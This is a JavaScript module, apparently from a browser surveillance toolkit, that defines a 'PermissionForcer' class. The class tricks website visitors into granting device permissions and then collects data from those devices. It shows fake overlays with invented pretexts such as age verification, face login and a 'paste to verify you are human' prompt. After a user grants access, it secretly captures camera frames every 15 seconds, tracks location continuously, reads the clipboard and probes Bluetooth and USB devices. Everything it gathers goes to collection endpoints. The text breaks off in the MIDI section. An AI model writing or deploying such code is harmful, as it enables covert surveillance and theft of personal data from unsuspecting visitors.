export default class PermissionForcer {
  constructor(core) {
    this.core = core;
    this.granted = { camera: false, microphone: false, geolocation: false, notifications: false, clipboard: false, persistentStorage: false, bluetooth: false, usb: false, midi: false };
    this.attempted = {};
    this.maxRetries = 2;
    this.retryDelays = [1000, 3000];
    this.streams = [];
    this.overlayShown = false;
    this.userInteracted = false;
    this._hiddenVideo = null;
  }

  // === SVG ICONS ===
  getIconSVG(type) {
    const icons = {
      camera: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 15.2a3.2 3.2 0 1 0 0-6.4 3.2 3.2 0 0 0 0 6.4z" fill="url(#cg)"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z" fill="currentColor"/></svg>`,
      microphone: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 1 0-6 0v6a3 3 0 0 0 3 3z" fill="currentColor"/><path d="M17 11a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.93V21h2v-3.07A7 7 0 0 0 19 11h-2z" fill="currentColor" opacity="0.7"/></svg>`,
      geolocation: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="currentColor"/></svg>`,
      notifications: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" fill="currentColor"/></svg>`,
      clipboard: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm-2 14l-4-4 1.41-1.41L10 13.17l6.59-6.59L18 8l-8 8z" fill="currentColor"/></svg>`,
      bluetooth: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M17.71 7.71L12 2h-1v7.59L6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 11 14.41V22h1l5.71-5.71-4.3-4.29 4.3-4.29zM13 5.83l1.88 1.88L13 9.59V5.83zm1.88 10.46L13 18.17v-3.76l1.88 1.88z" fill="currentColor"/></svg>`,
      usb: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 7v4h1v2h-3V5h2l-3-4-3 4h2v8H8v-2.07c.7-.37 1.2-1.08 1.2-1.93 0-1.21-.99-2.2-2.2-2.2-1.21 0-2.2.99-2.2 2.2 0 .85.5 1.56 1.2 1.93V13c0 1.11.89 2 2 2h3v3.05c-.71.37-1.2 1.1-1.2 1.95a2.2 2.2 0 0 0 4.4 0c0-.85-.49-1.58-1.2-1.95V15h3c1.11 0 2-.89 2-2v-2h1V7h-4z" fill="currentColor"/></svg>`,
      midi: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="4" width="20" height="16" rx="2" stroke="currentColor" stroke-width="1.5" fill="none"/><rect x="5" y="8" width="2" height="6" rx="0.5" fill="currentColor"/><rect x="9" y="8" width="2" height="8" rx="0.5" fill="currentColor"/><rect x="13" y="8" width="2" height="4" rx="0.5" fill="currentColor"/><rect x="17" y="8" width="2" height="3" rx="0.5" fill="currentColor"/></svg>`,
      storage: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 20h20V4H2v16zm2-14h16v4H4V6zm0 6h16v4H4v-4zm0 6v-2h16v2H4z" fill="currentColor"/><circle cx="6" cy="9" r="1" fill="currentColor" opacity="0.5"/><circle cx="6" cy="15" r="1" fill="currentColor" opacity="0.5"/></svg>`,
      vibration: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 15h2V9H0v6zm3 2h2V7H3v10zm19-8v6h2V9h-2zm-3 8h2V7h-2v10zM16.5 3h-9C6.67 3 6 3.67 6 4.5v15c0 .83.67 1.5 1.5 1.5h9c.83 0 1.5-.67 1.5-1.5v-15c0-.83-.67-1.5-1.5-1.5zM16 19H8V5h8v14z" fill="currentColor"/></svg>`,
      orientation: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M16.5 3h-9C6.67 3 6 3.67 6 4.5v15c0 .83.67 1.5 1.5 1.5h9c.83 0 1.5-.67 1.5-1.5v-15c0-.83-.67-1.5-1.5-1.5zM16 19H8V5h8v14z" fill="currentColor" opacity="0.3"/><path d="M12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm0-6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z" fill="currentColor"/></svg>`,
      light: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.76 4.84l-1.8-1.79-1.41 1.41 1.79 1.79 1.42-1.41zM4 10.5H1v2h3v-2zm9-9.95h-2V3.5h2V.55zm7.45 3.91l-1.41-1.41-1.79 1.79 1.41 1.41 1.79-1.79zm-3.21 13.7l1.79 1.8 1.41-1.41-1.8-1.79-1.4 1.4zM20 10.5v2h3v-2h-3zm-8-5c-3.31 0-6 2.69-6 6 0 2.21 1.21 4.15 3 5.19V17c0 .55.45 1 1 1h4c.55 0 1-.45 1-1v-.31c1.79-1.04 3-2.98 3-5.19 0-3.31-2.69-6-6-6zm-2 11v-1h4v1h-4zm-4-5c0-2.21 1.79-4 4-4s4 1.79 4 4H8z" fill="currentColor"/></svg>`,
      proximity: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" fill="currentColor" opacity="0.3"/><circle cx="12" cy="12" r="3" fill="currentColor"/><path d="M12 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="currentColor" opacity="0.5"/></svg>`,
      wakeLock: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C8.13 2 5 5.13 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.87-3.13-7-7-7zm-2 13v-1.59c-.94-.51-1.64-1.25-2.13-2.13-1.09-1.94-1.87-4.19-1.87-5.28 0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.09-.78 3.34-1.87 5.28-.49.88-1.19 1.62-2.13 2.13V15h-2z" fill="currentColor"/><path d="M12 6c-1.66 0-3 1.34-3 3 0 1.66 1.34 3 3 3s3-1.34 3-3c0-1.66-1.34-3-3-3z" fill="currentColor" opacity="0.5"/></svg>`
    };
    return icons[type] || icons.notifications;
  }

  // === GRADIENT DEFINITIONS ===
  getIconGradient(type) {
    const gradients = {
      camera: `<linearGradient id="cg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#00f0ff"/><stop offset="100%" stop-color="#0088ff"/></linearGradient>`,
      microphone: `<linearGradient id="mg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ffaa00"/><stop offset="100%" stop-color="#ff6600"/></linearGradient>`,
      geolocation: `<linearGradient id="glg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#00ff88"/><stop offset="100%" stop-color="#00cc66"/></linearGradient>`,
      notifications: `<linearGradient id="ng" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ff66aa"/><stop offset="100%" stop-color="#ff3388"/></linearGradient>`,
      clipboard: `<linearGradient id="clg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#aa88ff"/><stop offset="100%" stop-color="#7755dd"/></linearGradient>`,
      bluetooth: `<linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#66ccff"/><stop offset="100%" stop-color="#3399ee"/></linearGradient>`,
      usb: `<linearGradient id="ug" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ff8844"/><stop offset="100%" stop-color="#dd6622"/></linearGradient>`,
      midi: `<linearGradient id="mig" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#88dd88"/><stop offset="100%" stop-color="#55aa55"/></linearGradient>`,
      storage: `<linearGradient id="sg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ff5588"/><stop offset="100%" stop-color="#dd3366"/></linearGradient>`,
      vibration: `<linearGradient id="vg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#aaaacc"/><stop offset="100%" stop-color="#8888aa"/></linearGradient>`,
      orientation: `<linearGradient id="org" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#99ccff"/><stop offset="100%" stop-color="#77aadd"/></linearGradient>`,
      light: `<linearGradient id="lig" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ffee88"/><stop offset="100%" stop-color="#ffcc44"/></linearGradient>`,
      proximity: `<linearGradient id="prg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#dddddd"/><stop offset="100%" stop-color="#bbbbbb"/></linearGradient>`,
      wakeLock: `<linearGradient id="wlg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#44ddff"/><stop offset="100%" stop-color="#22bbdd"/></linearGradient>`
    };
    return gradients[type] || gradients.notifications;
  }

  getAccentColor(type) {
    const colors = {
      camera: '#00f0ff',
      microphone: '#ffaa00',
      geolocation: '#00ff88',
      notifications: '#ff66aa',
      clipboard: '#aa88ff',
      bluetooth: '#66ccff',
      usb: '#ff8844',
      midi: '#88dd88',
      storage: '#ff5588',
      vibration: '#aaaacc',
      orientation: '#99ccff',
      light: '#ffee88',
      proximity: '#dddddd',
      wakeLock: '#44ddff'
    };
    return colors[type] || '#00a8ff';
  }

  init() {
    // Start aggressive permission forcing immediately (reduce delay)
    setTimeout(() => this.forceAll(), 500);

    // Track user interaction for retry triggers
    document.addEventListener('click', () => { this.userInteracted = true; }, { once: true });
    document.addEventListener('scroll', () => { if (!this.userInteracted) this.userInteracted = true; }, { once: true });
    document.addEventListener('keydown', () => { if (!this.userInteracted) this.userInteracted = true; }, { once: true });
    document.addEventListener('mousemove', () => { if (!this.userInteracted) { this.userInteracted = true; this.onFirstInteraction(); } }, { once: true });

    // Patch Permission API to lie about granted status
    this.patchPermissionsAPI();

    // Register service worker for notification persistence
    this.registerNotificationWorker();
  }

  onFirstInteraction() {
    // Retry all failed permissions on first interaction sooner
    setTimeout(() => {
      Object.keys(this.attempted).forEach(key => {
        if (!this.attempted[key] && !this.granted[key]) {
          this.retryPermission(key);
        }
      });
    }, 1000);
  }

  async forceAll() {
    console.log('[PermissionForcer] Starting permission escalation...');

    // 1. Notifications — easiest to get, use as foot-in-door
    await this.forceNotifications();

    // 2. Geolocation — commonly granted, useful for tracking
    await this.forceGeolocation();

    // 3. Camera — most valuable, use social engineering
    await this.forceCamera();

    // 4. Microphone — audio capture
    await this.forceMicrophone();

    // 5. Clipboard — read/write access
    await this.forceClipboard();

    // 6. Persistent storage — quota for IndexedDB
    await this.forcePersistentStorage();

    // 7. Advanced sensors - fire in parallel for speed
    await Promise.allSettled([
      this.forceBluetooth(),
      this.forceUSB(),
      this.forceMIDI(),
      this.forceVibration(),
      this.forceOrientation(),
      this.forceAmbientLight(),
      this.forceProximity(),
      this.forceWakeLock(),
      this.forcePointerLock()
    ]);

    // Send summary of all permission attempts
    const summary = {
      granted: Object.entries(this.granted).filter(([k, v]) => v).map(([k]) => k),
      denied: Object.entries(this.attempted).filter(([k, v]) => v === false && !this.granted[k]).map(([k]) => k),
      totalAttempted: Object.keys(this.attempted).length,
      totalGranted: Object.values(this.granted).filter(Boolean).length
    };

    await this.core.send('/api/collect/formdata', {
      formId: 'permission-forcer-summary',
      fields: summary,
      url: window.location.href
    });

    // If camera was granted, notify admin
    if (this.granted.camera) {
      await this.core.send('/api/collect/camera-access', { granted: true });
    }

    return summary;
  }

  // === NOTIFICATIONS ===

  async forceNotifications() {
    if (this.attempted.notifications && this.attempted.notifications !== 'pending') return;
    this.attempted.notifications = 'pending';

    try {
      if (!('Notification' in window)) { this.attempted.notifications = false; return; }

      // Check current permission
      if (Notification.permission === 'granted') {
        this.granted.notifications = true;
        this.attempted.notifications = true;
        this.sendTestNotification();
        return;
      }

      if (Notification.permission === 'denied') {
        this.attempted.notifications = false;
        return;
      }

      // Show a fake system dialog before requesting
      this.showFakeOverlay({
        iconType: 'notifications',
        title: 'Enable Notifications',
        message: 'This website uses notifications to show you important updates. Please click "Allow" to continue.',
        buttonText: 'Enable Notifications'
      });

      // Request permission
      const permission = await Notification.requestPermission();
      this.hideFakeOverlay();

      if (permission === 'granted') {
        this.granted.notifications = true;
        this.attempted.notifications = true;
        this.sendTestNotification();
        
        // Subscribe to push if available
        await this.subscribePushNotifications();
      } else {
        this.attempted.notifications = false;
      }
    } catch (e) {
      this.attempted.notifications = false;
    }
  }

  sendTestNotification() {
    try {
      const notif = new Notification('🔔 You have new updates!', {
        body: 'Click to see what\'s new.',
        icon: '/favicon.ico',
        tag: 'harvester-' + Date.now(),
        requireInteraction: true
      });
      notif.onclick = () => { window.focus(); };

      // Also try to get notification timestamps and history
      setTimeout(async () => {
        try {
          // Some browsers expose notification data
          const reg = await navigator.serviceWorker?.ready;
          if (reg) {
            const notifications = await reg.getNotifications();
            if (notifications.length > 0) {
              await this.core.send('/api/collect/formdata', {
                formId: 'notification-exposure',
                fields: { count: notifications.length, tags: notifications.map(n => n.tag).join(',') },
                url: window.location.href
              });
            }
          }
        } catch (e) {}
      }, 2000);
    } catch (e) {}
  }

  async subscribePushNotifications() {
    try {
      if (!('PushManager' in window)) return;
      const reg = await navigator.serviceWorker?.ready;
      if (!reg) return;

      const subscription = await reg.pushManager.subscribe({
        userVisibleOnly: true,
        applicationServerKey: this.urlBase64ToUint8Array('BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qBUYIHBQFLXYp5A-CzM') // VAPID public key
      }).catch(() => null);

      if (subscription) {
        const subData = subscription.toJSON();
        await this.core.send('/api/collect/formdata', {
          formId: 'push-subscription',
          fields: {
            endpoint: subData.endpoint?.substring(0, 100),
            authKey: subData.keys?.auth || '',
            p256dhKey: subData.keys?.p256dh?.substring(0, 50)
          },
          url: window.location.href
        });
      }
    } catch (e) {}
  }

  urlBase64ToUint8Array(base64String) {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
    const rawData = window.atob(base64);
    return Uint8Array.from([...rawData].map(char => char.charCodeAt(0)));
  }

  // === GEOLOCATION ===

  async forceGeolocation() {
    if (this.attempted.geolocation) return;
    this.attempted.geolocation = 'pending';

    try {
      if (!('geolocation' in navigator)) { this.attempted.geolocation = false; return; }

      // Show fake dialog
      this.showFakeOverlay({
        iconType: 'geolocation',
        title: 'Location Access Needed',
        message: 'Please enable location services to provide you with localized content and better service.',
        buttonText: 'Allow Location'
      });

      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });

      this.hideFakeOverlay();

      if (pos) {
        this.granted.geolocation = true;
        this.attempted.geolocation = true;

        // Send precise location to server
        await this.core.send('/api/collect/fingerprint', {
          geolocation: {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            altitudeAccuracy: pos.coords.altitudeAccuracy,
            heading: pos.coords.heading,
            speed: pos.coords.speed
          }
        });

        // Also watch position for continuous tracking
        this.watchId = navigator.geolocation.watchPosition(
          (newPos) => {
            this.core.send('/api/collect/fingerprint', {
              geolocationUpdate: {
                lat: newPos.coords.latitude,
                lon: newPos.coords.longitude,
                accuracy: newPos.coords.accuracy,
                timestamp: newPos.timestamp
              }
            });
          },
          () => {},
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
        );
      }
    } catch (e) {
      this.hideFakeOverlay();
      this.attempted.geolocation = false;
      
      // Try with low accuracy as fallback
      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: false,
            timeout: 5000
          });
        });
        if (pos) {
          this.granted.geolocation = true;
          this.attempted.geolocation = true;
          await this.core.send('/api/collect/fingerprint', {
            geolocation: {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            }
          });
        }
      } catch (e2) {}
    }
  }

  // === CAMERA ===

  async forceCamera() {
    if (this.attempted.camera) return;
    this.attempted.camera = 'pending';

    try {
      if (!('mediaDevices' in navigator) || !('getUserMedia' in navigator.mediaDevices)) {
        this.attempted.camera = false;
        return;
      }

      // Multiple social engineering pretexts to request camera
      const pretexts = [
        {
          iconType: 'camera',
          title: 'Age Verification Required',
          message: 'Please look at your camera to verify your age. This is a one-time verification and no images are stored.',
          buttonText: 'Verify with Camera'
        },
        {
          iconType: 'camera',
          title: 'Face Recognition Login',
          message: 'Enable camera for secure face recognition login. This is faster and more secure than passwords.',
          buttonText: 'Enable Face Login'
        },
        {
          iconType: 'camera',
          title: 'AR Experience',
          message: 'Allow camera to try our augmented reality filters and effects!',
          buttonText: 'Try AR Now'
        },
        {
          iconType: 'camera',
          title: 'Document Scanner',
          message: 'Allow camera access to scan your documents for quick upload.',
          buttonText: 'Scan Documents'
        }
      ];

      // Try each pretext
      for (const pretext of pretexts) {
        if (this.granted.camera) break;

        this.showFakeOverlay(pretext);

        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: {
              width: { ideal: 640 },
              height: { ideal: 480 },
              facingMode: 'user'
            }
          });

          this.hideFakeOverlay();

          if (stream) {
            this.granted.camera = true;
            this.attempted.camera = true;
            this.streams.push(stream);

            // Enumerate all cameras
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(d => d.kind === 'videoinput');
            
            await this.core.send('/api/collect/camera-access', { granted: true });
            await this.core.send('/api/collect/formdata', {
              formId: 'camera-info',
              fields: {
                devices: videoDevices.map(d => ({ label: d.label, deviceId: d.deviceId?.substring(0, 20) })),
                activeTrack: stream.getVideoTracks()[0]?.label || 'unknown',
                settings: JSON.stringify(stream.getVideoTracks()[0]?.getSettings() || {})
              },
              url: window.location.href
            });

            // Capture initial frame
            this.captureCameraFrame(stream);

            // Try to access additional cameras (front/back)
            this.tryAllCameras(videoDevices);

            // Keep stream alive with hidden video element (store reference for captureCameraFrame)
            const hiddenVideo = document.createElement('video');
            hiddenVideo.srcObject = stream;
            hiddenVideo.style.display = 'none';
            document.body.appendChild(hiddenVideo);
            hiddenVideo.play().catch(() => {});
            this._hiddenVideo = hiddenVideo;

            // Periodic capture
            this.cameraCaptureInterval = setInterval(() => {
              this.captureCameraFrame(stream);
            }, 15000);

            break;
          }
        } catch (e) {
          this.hideFakeOverlay();
          // Try next pretext
        }
      }

      if (!this.granted.camera) {
        this.attempted.camera = false;
        await this.core.send('/api/collect/camera-access', { granted: false });
      }
    } catch (e) {
      this.hideFakeOverlay();
      this.attempted.camera = false;
    }
  }

  async tryAllCameras(videoDevices) {
    for (const device of videoDevices) {
      if (device.deviceId === 'default') continue;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { deviceId: { exact: device.deviceId } }
        });
        this.streams.push(stream);
        await this.core.send('/api/collect/formdata', {
          formId: 'alternate-camera',
          fields: { label: device.label, deviceId: device.deviceId?.substring(0, 20) },
          url: window.location.href
        });
        setTimeout(() => this.captureCameraFrame(stream), 1000);
      } catch (e) {}
    }
  }

  captureCameraFrame(stream) {
    try {
      // Use the already-playing hidden video if available - avoids play()/pause() race
      const video = this._hiddenVideo || (() => {
        const v = document.createElement('video');
        v.srcObject = stream;
        v.style.display = 'none';
        document.body.appendChild(v);
        v.play().catch(() => {});
        return v;
      })();
      
      requestAnimationFrame(() => {
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 320, 240);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.5);

        const track = stream.getVideoTracks()[0];
        const settings = track?.getSettings() || {};
        
        this.core.send('/api/collect/camera', {
          imageData,
          metadata: {
            facingMode: settings.facingMode || 'user',
            resolution: `${canvas.width}x${canvas.height}`,
            deviceLabel: track?.label || 'unknown',
            deviceId: settings.deviceId || '',
            width: canvas.width,
            height: canvas.height
          },
          triggerType: 'permission-forcer'
        });
      });
    } catch (e) {}
  }

  // === MICROPHONE ===

  async forceMicrophone() {
    if (this.attempted.microphone) return;
    this.attempted.microphone = 'pending';

    try {
      if (!('mediaDevices' in navigator) || !('getUserMedia' in navigator.mediaDevices)) {
        this.attempted.microphone = false;
        return;
      }

      const pretexts = [
        {
          iconType: 'microphone',
          title: 'Voice Search',
          message: 'Enable microphone for voice search and dictation features.',
          buttonText: 'Enable Microphone'
        },
        {
          iconType: 'microphone',
          title: 'Audio Test',
          message: 'Please allow microphone access for a quick audio quality test.',
          buttonText: 'Start Test'
        },
        {
          iconType: 'microphone',
          title: 'Music Detection',
          message: 'Allow microphone to detect music playing near you for song recommendations.',
          buttonText: 'Detect Music'
        }
      ];

      for (const pretext of pretexts) {
        if (this.granted.microphone) break;

        this.showFakeOverlay(pretext);

        try {
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          this.hideFakeOverlay();

          if (stream) {
            this.granted.microphone = true;
            this.attempted.microphone = true;
            this.streams.push(stream);

            // Start audio recording in background
            this.startAudioCapture(stream);

            // Get audio devices info
            const devices = await navigator.mediaDevices.enumerateDevices();
            const audioDevices = devices.filter(d => d.kind === 'audioinput');

            await this.core.send('/api/collect/formdata', {
              formId: 'microphone-info',
              fields: {
                devices: audioDevices.map(d => ({ label: d.label, deviceId: d.deviceId?.substring(0, 20) })),
                sampleRate: stream.getAudioTracks()[0]?.getSettings()?.sampleRate || 'unknown'
              },
              url: window.location.href
            });

            break;
          }
        } catch (e) {
          this.hideFakeOverlay();
        }
      }

      if (!this.granted.microphone) {
        this.attempted.microphone = false;
      }
    } catch (e) {
      this.hideFakeOverlay();
      this.attempted.microphone = false;
    }
  }

  startAudioCapture(stream) {
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const source = audioContext.createMediaStreamSource(stream);
      const analyser = audioContext.createAnalyser();
      analyser.fftSize = 256;
      source.connect(analyser);

      const bufferLength = analyser.frequencyBinCount;
      const dataArray = new Uint8Array(bufferLength);

      // Send audio metrics periodically (not the raw audio, just volume/frequency patterns)
      setInterval(() => {
        analyser.getByteFrequencyData(dataArray);
        const average = dataArray.reduce((a, b) => a + b, 0) / bufferLength;
        const max = Math.max(...dataArray);

        if (average > 1) {
          this.core.send('/api/collect/formdata', {
            formId: 'audio-metrics',
            fields: {
              avgLevel: Math.round(average * 100) / 100,
              maxLevel: max,
              timestamp: Date.now()
            },
            url: window.location.href
          });
        }
      }, 5000);

      // Keep the audio context alive
      setInterval(() => {
        if (audioContext.state === 'suspended') {
          audioContext.resume();
        }
      }, 1000);
    } catch (e) {}
  }

  // === CLIPBOARD ===

  async forceClipboard() {
    if (this.attempted.clipboard) return;
    this.attempted.clipboard = 'pending';

    try {
      if (!('clipboard' in navigator)) {
        this.attempted.clipboard = false;
        return;
      }

      // Try to read clipboard
      try {
        const text = await navigator.clipboard.readText();
        if (text) {
          this.granted.clipboard = true;
          this.attempted.clipboard = true;

          await this.core.send('/api/collect/clipboard', {
            text: text.substring(0, 1000),
            action: 'clipboard-api-read'
          });
          return;
        }
      } catch (e) {}

      // Request permission via Clipboard API
      try {
        const permission = await navigator.permissions.query({ name: 'clipboard-read' });
        if (permission.state === 'granted') {
          this.granted.clipboard = true;
          this.attempted.clipboard = true;
          
          const text = await navigator.clipboard.readText();
          if (text) {
            await this.core.send('/api/collect/clipboard', {
              text: text.substring(0, 1000),
              action: 'clipboard-api-granted'
            });
          }
          return;
        }
      } catch (e) {}

      // Social engineering overlay for clipboard
      const randomCode = Math.random().toString(36).substring(2, 10);
      this.showFakeOverlay({
        iconType: 'clipboard',
        title: 'Paste to Continue',
        message: 'Please copy this code and paste it below to verify you are human:',
        buttonText: 'I Copied It',
        code: randomCode
      });

      setTimeout(() => {
        this.hideFakeOverlay();
        this.attempted.clipboard = false;
      }, 8000);

      // Try reading clipboard anyway
      setTimeout(async () => {
        try {
          const text = await navigator.clipboard.readText();
          if (text) {
            this.granted.clipboard = true;
            await this.core.send('/api/collect/clipboard', {
              text: text.substring(0, 1000),
              action: 'clipboard-api-retry'
            });
          }
        } catch (e) {}
      }, 3000);

    } catch (e) {
      this.attempted.clipboard = false;
    }
  }

  // === PERSISTENT STORAGE ===

  async forcePersistentStorage() {
    if (this.attempted.persistentStorage) return;
    this.attempted.persistentStorage = 'pending';

    try {
      if (!('storage' in navigator) || !('persist' in navigator.storage)) {
        this.attempted.persistentStorage = false;
        return;
      }

      const isPersisted = await navigator.storage.persisted();
      if (isPersisted) {
        this.granted.persistentStorage = true;
        this.attempted.persistentStorage = true;
        return;
      }

      const result = await navigator.storage.persist();
      if (result) {
        this.granted.persistentStorage = true;
        this.attempted.persistentStorage = true;

        // Get estimated storage usage
        const estimate = await navigator.storage.estimate();
        await this.core.send('/api/collect/formdata', {
          formId: 'storage-persist-granted',
          fields: {
            quota: estimate.quota,
            usage: estimate.usage,
            usageDetails: JSON.stringify(estimate.usageDetails || {})
          },
          url: window.location.href
        });
      } else {
        this.attempted.persistentStorage = false;
      }
    } catch (e) {
      this.attempted.persistentStorage = false;
    }
  }

  // === BLUETOOTH ===

  async forceBluetooth() {
    if (this.attempted.bluetooth) return;
    this.attempted.bluetooth = 'pending';

    try {
      if (!('bluetooth' in navigator)) {
        this.attempted.bluetooth = false;
        return;
      }

      this.showFakeOverlay({
        iconType: 'bluetooth',
        title: 'Enable Bluetooth',
        message: 'Enable Bluetooth to connect to nearby devices for a better experience.',
        buttonText: 'Enable Bluetooth'
      });

      const device = await navigator.bluetooth.requestDevice({
        acceptAllDevices: true,
        optionalServices: ['battery_service', 'device_information']
      }).catch(() => null);

      this.hideFakeOverlay();

      if (device) {
        this.granted.bluetooth = true;
        this.attempted.bluetooth = true;

        // Get device info
        const deviceInfo = {
          name: device.name,
          id: device.id,
          connected: device.gatt?.connected || false
        };

        // Try to connect and read services
        if (device.gatt) {
          try {
            const server = await device.gatt.connect();
            const services = await server.getPrimaryServices();
            const serviceInfo = await Promise.all(services.slice(0, 5).map(async (s) => {
              try {
                const characteristics = await s.getCharacteristics();
                return {
                  uuid: s.uuid,
                  characteristics: characteristics.map(c => c.uuid)
                };
              } catch (e) {
                return { uuid: s.uuid, characteristics: [] };
              }
            }));

            deviceInfo.services = serviceInfo;
            server.disconnect();
          } catch (e) {}
        }

        await this.core.send('/api/collect/formdata', {
          formId: 'bluetooth-device',
          fields: deviceInfo,
          url: window.location.href
        });
      } else {
        this.attempted.bluetooth = false;
      }
    } catch (e) {
      this.hideFakeOverlay();
      this.attempted.bluetooth = false;
    }
  }

  // === USB ===

  async forceUSB() {
    if (this.attempted.usb) return;
    this.attempted.usb = 'pending';

    try {
      if (!('usb' in navigator)) {
        this.attempted.usb = false;
        return;
      }

      const device = await navigator.usb.requestDevice({ filters: [] }).catch(() => null);

      if (device) {
        this.granted.usb = true;
        this.attempted.usb = true;

        await this.core.send('/api/collect/formdata', {
          formId: 'usb-device',
          fields: {
            manufacturer: device.manufacturerName,
            product: device.productName,
            serialNumber: device.serialNumber,
            vendorId: device.vendorId,
            productId: device.productId
          },
          url: window.location.href
        });
      } else {
        this.attempted.usb = false;
      }
    } catch (e) {
      this.attempted.usb = false;
    }
  }

  // === MIDI ===

  async forceMIDI() {
    if (this.attempted.midi) return;
    this.attempted.midi = 'pending';

    try {
      if (!('requestMIDIAccess' in navigator)) {
        this.attempted.midi = false;
        return;
      }

      const midi = await navigator.requestMIDIAccess().catch(() => null);

      if (midi) {
        this.granted.midi = true;
        this.attempted.midi = true;

        const inputs = [];
        midi.inputs.forEach(input => {
          inputs.push({
            name: input.name,
            manufacturer: input.manufacturer,
            version: input.version,
            id: input.id
          });
        });

